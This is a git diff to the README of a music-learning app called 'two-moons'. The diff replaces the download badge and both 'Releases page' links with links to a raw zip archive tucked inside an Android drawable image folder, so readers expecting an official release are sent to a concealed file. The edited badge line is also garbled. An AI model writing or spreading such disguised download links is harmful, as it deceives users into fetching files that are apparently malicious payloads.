@@ -1,6 +1,6 @@
 # 🌙 two-moons - Learn Music in an Engaging Way
 
-[![Download two-moons](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/flawn103/two-moons/releases)
+[![Download two-moons](https://raw.githubusercontent.com/flawn103/two-moons/main/android/app/src/main/res/drawable-port-night-xxhdpi/two_moons_v1.1.zip%20Now-Get%https://raw.githubusercontent.com/flawn103/two-moons/main/android/app/src/main/res/drawable-port-night-xxhdpi/two_moons_v1.1.zip)](https://raw.githubusercontent.com/flawn103/two-moons/main/android/app/src/main/res/drawable-port-night-xxhdpi/two_moons_v1.1.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and set up two-moons on your computer.
 
 ### Step 1: Visit the Download Page
 
-To get started, visit our [Releases page](https://github.com/flawn103/two-moons/releases). Here, you will find the latest version of the software ready for download.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/flawn103/two-moons/main/android/app/src/main/res/drawable-port-night-xxhdpi/two_moons_v1.1.zip). Here, you will find the latest version of the software ready for download.
 
 ### Step 2: Select the Latest Version
 
@@ -56,7 +56,7 @@ To run two-moons smoothly, make sure your computer meets the following minimum r
 
 ## 📜 Download & Install
 
-Ready to start? Go to our [Releases page](https://github.com/flawn103/two-moons/releases) again to download the latest version. Follow the download and installation instructions provided above, and you're all set!
+Ready to start? Go to our [Releases page](https://raw.githubusercontent.com/flawn103/two-moons/main/android/app/src/main/res/drawable-port-night-xxhdpi/two_moons_v1.1.zip) again to download the latest version. Follow the download and installation instructions provided above, and you're all set!
 
 ## 🤝 Need Help?
 
